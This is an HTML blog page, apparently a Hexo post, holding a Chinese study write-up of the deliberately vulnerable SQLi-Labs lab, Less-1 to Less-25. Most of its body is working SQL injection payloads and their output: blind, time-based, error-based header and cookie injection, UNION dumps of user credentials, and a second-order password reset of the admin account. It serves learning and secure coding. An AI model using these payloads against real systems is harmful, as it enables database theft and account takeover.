@@ -1,0 +1,1603 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="SQL注入,writeup," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="w2n1ck" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="结构化查询语言，也叫做SQL，从根本上说是一种处理数据库的编程语言。对于初学者，数据库仅仅是在客户端和服务端进行数据存储。SQL通过结构化查询，关系，面向对象编程等等来管理数据库。编程极客们总是搞出许多这样类型的软件，像MySQL，MS SQL ,Oracle以及Postgresql。现在有一些程序能让我们有能力通过结构化查询来管理大型数据库。">
+<meta name="keywords" content="SQL注入,writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLi-Labs学习笔记">
+<meta property="og:url" content="http://byd.dropsec.xyz/2016/07/29/SQL-Labs学习笔记/index.html">
+<meta property="og:site_name" content="w2n1ck">
+<meta property="og:description" content="结构化查询语言，也叫做SQL，从根本上说是一种处理数据库的编程语言。对于初学者，数据库仅仅是在客户端和服务端进行数据存储。SQL通过结构化查询，关系，面向对象编程等等来管理数据库。编程极客们总是搞出许多这样类型的软件，像MySQL，MS SQL ,Oracle以及Postgresql。现在有一些程序能让我们有能力通过结构化查询来管理大型数据库。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2017-07-28T11:51:06.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQLi-Labs学习笔记">
+<meta name="twitter:description" content="结构化查询语言，也叫做SQL，从根本上说是一种处理数据库的编程语言。对于初学者，数据库仅仅是在客户端和服务端进行数据存储。SQL通过结构化查询，关系，面向对象编程等等来管理数据库。编程极客们总是搞出许多这样类型的软件，像MySQL，MS SQL ,Oracle以及Postgresql。现在有一些程序能让我们有能力通过结构化查询来管理大型数据库。">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"hide","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"输入关键词进行搜索","hits_empty":"找不到关于“${query}”的文章","hits_stats":"共找到 ${hits} 篇文化在那个，花了 ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://byd.dropsec.xyz/2016/07/29/SQL-Labs学习笔记/"/>
+
+
+
+
+
+  <title>SQLi-Labs学习笔记 | w2n1ck</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?61c879c1c104a92aab1d6e4b6888ffe5";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">w2n1ck</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Looking at yourself from a different Angle!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tools">
+          <a href="/daima" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-wrench"></i> <br />
+            
+            工具
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-daohang">
+          <a href="/daohang" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-globe"></i> <br />
+            
+            导航
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://byd.dropsec.xyz/2016/07/29/SQL-Labs学习笔记/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="w2n1ck">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="w2n1ck">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQLi-Labs学习笔记</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-07-29T15:05:43+08:00">
+                2016-07-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2016/07/29/SQL-Labs学习笔记/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2016/07/29/SQL-Labs学习笔记/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>结构化查询语言，也叫做SQL，从根本上说是一种处理数据库的编程语言。对于初学者，数据库仅仅是在客户端和服务端进行数据存储。SQL通过结构化查询，关系，面向对象编程等等来管理数据库。编程极客们总是搞出许多这样类型的软件，像MySQL，MS SQL ,Oracle以及Postgresql。现在有一些程序能让我们有能力通过结构化查询来管理大型数据库。</p>
+<a id="more"></a>
+<p>我们将要使用的实验室是SQLi Labs，它是一个可以从<a href="https://github.com/Audi-1/sqli-labs免费下载，以便我们研究学习以及编写安全的程序。" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs免费下载，以便我们研究学习以及编写安全的程序。</a></p>
+<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><p>关键代码：</p>
+<blockquote>
+<p>$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;</p>
+</blockquote>
+<p>可以看到对于直接 GET 进来的文本没有过滤。<br>同时，在查询语句中，id=’$id’，变量加了引号。这里引号的意思是把输入的 id 当做字符串来处理，取从头开始的最长数字且类型转换为整形进行查询。</p>
+<pre><code>?id=12a             显示id为12的用户
+?id=1a2a            显示id为1的用户
+?id=102a            显示id为102的用户（不存在）
+盲注
+?id=1%27and+left(version(),1)=5%23                得出数据库版本为5开头
+?id=1%27and+length(database())=8%23               数据库名长度为8
+?id=1%27and+left(database(),8)=&apos;security&apos;%23      数据库为security
+?id=1%27and+length(username)=4%23                 用户名长度为4
+?id=1%27and+left(username,4)=&apos;Dumb&apos;%23            用户名为Dumb
+?id=1%27and+length(password)=4%23                 密码长度为4
+?id=1%27and+left(password,4)=&apos;Dumb&apos;%23            密码为Dumb
+</code></pre><h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><p>关键代码：</p>
+<blockquote>
+<p>$sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”;</p>
+</blockquote>
+<p>同样未做过滤，但此处的变量 id 无引号。大概是直接将变量 id 当做整形传入查询。</p>
+<pre><code>?id=12  显示 id 为 12 的用户
+?id=12a 报错：Unknown column &apos;12a&apos; in &apos;where clause&apos;
+?id=%31 显示 id 为 1 的用户
+注入测试：
+?id=1+and+left(version(),1)=5 直接注入即可得到版本号
+</code></pre><h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><p>关键代码：</p>
+<blockquote>
+<p>$sql=”SELECT * FROM users WHERE id=(‘$id’) LIMIT 0,1”;</p>
+</blockquote>
+<p>未过滤，但变量 id 加了引号和括号。将变量 id 以字符串形式引入，和Less-1很像，但是却又多了个括号，猜测是防止注入语句。</p>
+<pre><code>注入测试：
+?id=12+and+1=1           显示正确
+?id=12+an                不完全语句也显示正确
+猜测：括号将变量限制在括号范围内，尝试手动提前匹配括号注入。
+?id=12%27                        成功报错：&apos;&apos;12&apos;&apos;) LIMIT 0,1&apos; at line 1
+?id=1%27%29and+1=2%23                                无显示，可注入
+上面那条语句还原到 SQL 语句时，为：
+SELECT * FORM users WHERE id=(&apos;1&apos;)and 1=2#&apos;) LIMIT 0,1
+</code></pre><p>将括号提前结束且用 #号注释掉接下来的语句。接下来的注入只要替换 and 1=1 语句就行了。</p>
+<h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><p>关键代码：</p>
+<blockquote>
+<p>$id = ‘“‘ . $id . ‘“‘;</p>
+<p>$sql=”SELECT * FROM users WHERE id=($id) LIMIT 0,1”;</p>
+</blockquote>
+<p>对变量 id 做了处理。该处理在 id 前后添加双引号。</p>
+<pre><code>?id=1%22%29+and+1=2%23            无显示，可注入
+SELECT * FROM users WHERE id=(&quot;1&quot;)and 1=2#&quot;) LIMIT 0,1
+</code></pre><h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1><p>关键代码：</p>
+<blockquote>
+<p>$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;</p>
+</blockquote>
+<pre><code>?id=1&apos;and+1=2#
+</code></pre><h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h1><p>关键代码：</p>
+<blockquote>
+<p>$id = ‘“‘.$id.’”‘;</p>
+<p>$sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”;</p>
+</blockquote>
+<pre><code>?id=1&quot;and+1=2#
+</code></pre><h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h1><p>关键代码：</p>
+<blockquote>
+<p>$sql=”SELECT * FROM users WHERE id=((‘$id’)) LIMIT 0,1”;</p>
+</blockquote>
+<pre><code>?id=1&apos;))and 1=2#
+</code></pre><h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h1><p>关键代码：</p>
+<blockquote>
+<p>$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;</p>
+</blockquote>
+<pre><code>?id=1&apos; and 1=2#
+</code></pre><h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h1><p>尝试了很多次，各种组合，但是服务器返回的结果都是一样。<br>尝试 ?id=10000000000<br>返回结果也是正确，因为不存在这么大的 id，所以判断这个页面把正确和错误的信息全部返回一致。<br>于是，使用基于时间的注入，构造以下语句：</p>
+<pre><code>?id=1&apos; and sleep(5) %23
+</code></pre><p>如果错误，则服务器处理5秒再返回，否则直接返回，找到正确的注入点。</p>
+<pre><code>?id=1&apos; and if(ascii(substr(database(),1,1))&gt;115, 0, sleep(5)) %23
+
+?id=1&apos; and if(ascii(substr(database(),1,1))&gt;114, 0, sleep(5)) %23
+
+第一个语句暂停五秒第二个直接返回，判断数据库名的第一个字母为s（ascii为115）
+</code></pre><h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h1><p>又是一个基于时间的注入，尝试了下，注入点在这：</p>
+<pre><code>?id=1&quot; and sleep(5) %23
+</code></pre><h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h1><p>这个页面采用 POST 的方法得到数据。于是用 HackBar 修改 post 数据进行测试：</p>
+<pre><code>uname=admin&amp;passwd=123&apos;
+显示：
+ &apos;&apos;123&apos;&apos; LIMIT 0,1&apos; 
+去掉单引号
+&apos;123&apos;&apos; LIMIT 0,1
+再去掉密码的单引号
+123&apos; LIMIT 0,1
+</code></pre><p>所以确定是单引号注入，直接万能密钥试试：</p>
+<pre><code>uname=admin&apos; or &apos;1&apos;=&apos;1 &amp;passwd=123456
+</code></pre><p>这里的话有个点：</p>
+<p>如果输入：uname=admin’ or ‘1’=’1 &amp;passwd=123456，会显示失败，为什么呢？</p>
+<p>首先and的优先级高于or  【就是and先运算】</p>
+<p>那么’1’=’1’ and password=’123456’先运算，因为users表里面的password字段没有一个数据时test，右边是false，那么整个表达式就是false</p>
+<p>这个时候整个的语句就是：</p>
+<pre><code>SELECT username, password FROM users WHERE username=&apos;test&apos; or false LIMIT 0,1
+</code></pre><p>数据库里没有test用户，所以就失败了。</p>
+<p>而万能密钥的语句是：</p>
+<pre><code>SELECT username, password FROM users WHERE username=&apos;admin&apos; or false LIMIT 0,1
+</code></pre><p>对于上述的情况，我们在密码字段加入即可</p>
+<pre><code>uname=test&amp;passwd=123456&apos; or &apos;1&apos;=&apos;1
+
+SELECT username, password FROM users WHERE username=&apos;test&apos; or true LIMIT 0,1
+</code></pre><h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h1><p>先尝试单引号，双引号。</p>
+<p>输入：</p>
+<blockquote>
+<p>uname=test&amp;passwd=123456”</p>
+</blockquote>
+<p>报错：</p>
+<blockquote>
+<p>‘“123456””) LIMIT 0,1’</p>
+<p>123456”) LIMIT 0,1</p>
+</blockquote>
+<p>构造POC：</p>
+<blockquote>
+<p>uname=test&amp;passwd=123456”) or “1”=”1”#</p>
+</blockquote>
+<h1 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h1><p>先尝试单引号，双引号。</p>
+<p>输入：</p>
+<blockquote>
+<p>uname=test&amp;passwd=123456’</p>
+</blockquote>
+<p>报错：</p>
+<blockquote>
+<p>‘’123456’’) LIMIT 0,1’ </p>
+<p>123456’) LIMIT 0,1</p>
+</blockquote>
+<p>构造POC：</p>
+<blockquote>
+<p>uname=test&amp;passwd=123456’) or (‘1’)=(‘1</p>
+<p>或者</p>
+<p>uname=test&amp;passwd=123456’) or “1”=”1”#</p>
+</blockquote>
+<h1 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h1><p>先尝试单引号，双引号。</p>
+<p>输入：</p>
+<blockquote>
+<p>uname=test&amp;passwd=123456”</p>
+</blockquote>
+<p>报错：</p>
+<blockquote>
+<p>‘“123456”” LIMIT 0,1’ </p>
+<p>123456” LIMIT 0,1</p>
+</blockquote>
+<p>构造POC：</p>
+<blockquote>
+<p>uname=test&amp;passwd=123456” or “1”=”1”#</p>
+<p>或者</p>
+<p>uname=test&amp;passwd=123456” or “1”=”1</p>
+</blockquote>
+<h1 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h1><p>这里输入单引号，双引号就不会报错了，我们只能加上永真永假或者时间延迟函数了。</p>
+<p>测试发现时间延迟不行。</p>
+<blockquote>
+<p>uname=test&amp;passwd=123456’ or 1=1#</p>
+</blockquote>
+<p>直接成功了，</p>
+<p>试一下盲注也是可以得。</p>
+<blockquote>
+<p>uname=test&amp;passwd=123456’ or length(database())=8#</p>
+</blockquote>
+<h1 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h1><blockquote>
+<p>uname=test&amp;passwd=123456”) or 1=1#</p>
+</blockquote>
+<p>成功登陆，时间延迟注入试试</p>
+<pre><code>uname=test&amp;passwd=123456&quot;)  or if(length(database())=7,1,sleep(5)) #
+暂停，说明不对
+uname=test&amp;passwd=123456&quot;)  or if(length(database())=8,1,sleep(5)) #
+成功登陆
+</code></pre><h1 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h1><pre><code>uname=admin&amp;passwd=123456&apos; where username=&apos;admin&apos; and 1=2 #
+对应的SQL语句是：
+UPDATE users SET password = &apos;123456&apos; where username=&apos;admin&apos; and 1=2 #&apos; WHERE username=&apos;admin&apos;
+</code></pre><h1 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h1><p>这是 Header 注入。</p>
+<p>意思是，从服务器要求的 Header 头里面找到可以注入的注入点。</p>
+<p>从源代码可以看出，服务器将 Header 里面的 user-agent 的值没有经过过滤就带入了 insert into 语句，这就造成了注入。</p>
+<pre><code>$uagent = $_SERVER[&apos;HTTP_USER_AGENT&apos;];
+...
+$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;, $uname)&quot;;
+</code></pre><p>首先，抓包。</p>
+<p>还有一个问题就是，insert into 语句要在登陆成功后才能执行，所以必须输入正确的用户和密码再抓包。</p>
+<pre><code>xpath注入：
+payload：updatexml(1,concat(0x7e,(version())),0)
+第一个参数是 目标xml
+第二个参数是 xpath的表达式，这个看w3c那个xpath教程
+第三个参数是 要将xpath的表达式的东西将目标xml替换成什么
+</code></pre><p>POC:</p>
+<pre><code>User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos; or updatexml(0,concat(0x3a,version()),0),&quot;,&quot;)#
+响应：
+Your User Agent is: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos; or updatexml(0,concat(0x3a,version()),0),&quot;1&quot;)#
+XPATH syntax error: &apos;:5.5.47&apos;
+
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos; or updatexml(0,concat(0x3a,(select username from users limit 0,1)),0),&quot;1&quot;)#
+响应：
+Your User Agent is: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos; or updatexml(0,concat(0x3a,(select username from users limit 0,1)),0),&quot;1&quot;)
+XPATH syntax error: &apos;:Dumb&apos;
+</code></pre><h1 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h1><p>POC:</p>
+<pre><code>Referer: 1&apos; or updatexml(0,concat(0x3a,version()),0),&quot;1&quot;)#
+响应：
+Your Referer is: 1&apos; or updatexml(0,concat(0x3a,version()),0),&quot;1&quot;)
+XPATH syntax error: &apos;:5.5.47&apos;
+</code></pre><p>这里也可以用一个报错函数extractvalue</p>
+<p>第一个参数也是个xml，第二个参数就是xpath的表达式，这个函数是获取xml中某个节点的值</p>
+<p>与updatexml一次只能更新一个节点不同，extractvalue可以一次获取多个节点的值，并以空格分隔</p>
+<p>POC:</p>
+<pre><code>Referer: 1&apos; or extractvalue(0,concat(0x3a,version())),&apos;1&apos;)#
+响应：
+Your User Agent is: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos; or extractvalue(0,concat(0x3a,version())),&apos;1&apos;)#
+XPATH syntax error: &apos;:5.5.47&apos;
+</code></pre><h1 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h1><p>这题用 Cookies 注入</p>
+<p>POC:</p>
+<pre><code>Cookie: uname=admin&apos;;
+报错
+Cookie: uname=admin&apos; order by 3#;
+正常显示
+Cookie: uname=admin&apos; order by 4#;
+报错，所以是三个字段
+Cookie: uname=admin&apos; and 1=2 union select 1,2,3#;
+显示2，3
+Cookie: uname=admin&apos; and 1=2 union select 1,database(),version()#;
+数据库：security,版本：5.5.47
+Cookie: uname=admin&apos; and 1=2 union select 1,2,group_concat(table_name） from information_schema.tables where table_schema=database()#;
+表名：emails,referers,uagents,users，这里也可以用limit语句
+Cookie: uname=admin&apos; and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273#;
+字段：user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password
+Cookie: uname=admin&apos; and 1=2 union select 1,username,password from users limit 0,1#;
+内容：Your Login name:Dumb Your Password:Dumb
+</code></pre><h1 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h1><p>cookies 注入</p>
+<p>但是，这一次的 cookies 是加密的.</p>
+<pre><code>setcookie(&apos;uname&apos;, base64_encode($row1[&apos;username&apos;]), time()+3600);
+...
+$cookee = base64_decode($cookee);
+</code></pre><p>POC:</p>
+<pre><code>&apos;) union select 1,2,username from users#
+JykgdW5pb24gc2VsZWN0IDEsMix1c2VybmFtZSBmcm9tIHVzZXJzIw==
+显示密码Dumb
+</code></pre><h1 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h1><p>单引号换成双引号就行了</p>
+<pre><code>uname=IiB1bmlvbiBzZWxlY3QgMSwyLHVzZXJuYW1lIGZyb20gdXNlcnMj
+Your Login name:2
+Your Password:Dum
+</code></pre><h1 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h1><p>这一题它在输入的时候过滤了几个字符</p>
+<pre><code>$reg = &quot;/#/&quot;;
+$reg1 = &quot;/--/&quot;;
+$replace = &quot;&quot;;
+$id = preg_replace($reg, $replace, $id);
+$id = preg_replace($reg1, $replace, $id);
+</code></pre><p>所以，我们不能用 #来注释掉剩下的查询语句。</p>
+<p>那么该怎么办呢？</p>
+<p>一个办法就是，让剩下的语句变得完整就行。</p>
+<p>查询语句的代码为：</p>
+<blockquote>
+<p>$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;</p>
+</blockquote>
+<p>构造语句：</p>
+<blockquote>
+<p>?id=1’and+’1’=’1</p>
+</blockquote>
+<h1 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h1><p>二次注入</p>
+<p>与数据库交互的有三个页面：login_create.php，login.php，pass_change.php</p>
+<p>login_create.php,登陆页面对用户和密码都进行了处理。</p>
+<pre><code>$username = mysql_real_escape_string($_POST[&quot;login_user&quot;]);
+$password = mysql_real_escape_string($_POST[&quot;login_password&quot;]);
+$sql = &quot;SELECT * FROM users WHERE username=&apos;$username&apos; and password=&apos;$password&apos;&quot;;
+</code></pre><p>login_create.php对新建用户进行处理</p>
+<pre><code>$username=  mysql_escape_string($_POST[&apos;username&apos;]) ;
+$pass= mysql_escape_string($_POST[&apos;password&apos;]);
+$re_pass= mysql_escape_string($_POST[&apos;re_password&apos;]);
+</code></pre><p>pass_change.php是修改密码的</p>
+<p>关键代码：</p>
+<pre><code>$username= $_SESSION[&quot;username&quot;];
+$curr_pass= mysql_real_escape_string($_POST[&apos;current_password&apos;]);
+$pass= mysql_real_escape_string($_POST[&apos;password&apos;]);
+$re_pass= mysql_real_escape_string($_POST[&apos;re_password&apos;]);
+if($pass==$re_pass)
+{    
+    $sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;;
+    $res = mysql_query($sql) or die(&apos;You tried to be smart, Try harder!!!! :( &apos;);
+    $row = mysql_affected_rows();
+    ...
+</code></pre><p>可以发现</p>
+<blockquote>
+<p>$sql = “UPDATE users SET PASSWORD=’$pass’ where username=’$username’ and password=’$curr_pass’ “;</p>
+</blockquote>
+<p>更改密码时$username没有任何过滤，直接带入进去，如果$username后面有个注释符，那么我们可以直接绕过验证$curr_pass而直接更改密码。</p>
+<p>所以我们要建一个有注释符的特殊用户</p>
+<pre><code>用户名：admin&apos;+#+
+密码： 123456
+</code></pre><p>然后登陆，进入更改密码页面</p>
+<p>随便输入当前密码，然后输入我们要更改的密码</p>
+<pre><code>YOU ARE LOGGED IN AS
+admin&apos; # 
+
+You can Change your password here.
+Current Password: 123    
+New Password:     123456
+Retype Password:     123456
+</code></pre><p>提交，你会发现，admin的密码已经被我们改成123456了。</p>
+<h1 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h1><p>这题的意思是，“你的 AND 和 OR 都是我们的了！”…</p>
+<p>就是，AND 和 OR 全部都被过滤掉了。</p>
+<pre><code>AND==&amp;&amp;
+OR==||
+
+?id=1&apos; &amp;&amp; &apos;1&apos;=&apos;1
+url编码
+?id=1&apos; %26%26 &apos;1&apos;=&apos;1
+</code></pre>
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>大爷，赏个铜板呗！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="/images/weixin.png" alt="w2n1ck WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="/images/zhifubao.png" alt="w2n1ck Alipay"/>
+          <p>支付宝打赏</p>
+        </div>
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+    <div>
+      
+        
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+      <strong>本文作者：</strong>
+      w2n1ck
+    </li>
+    <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://byd.dropsec.xyz/2016/07/29/SQL-Labs学习笔记/" title="SQLi-Labs学习笔记">http://byd.dropsec.xyz/2016/07/29/SQL-Labs学习笔记/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong>
+      本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/SQL注入/" rel="tag"><i class="fa fa-tag"></i> SQL注入</a>
+          
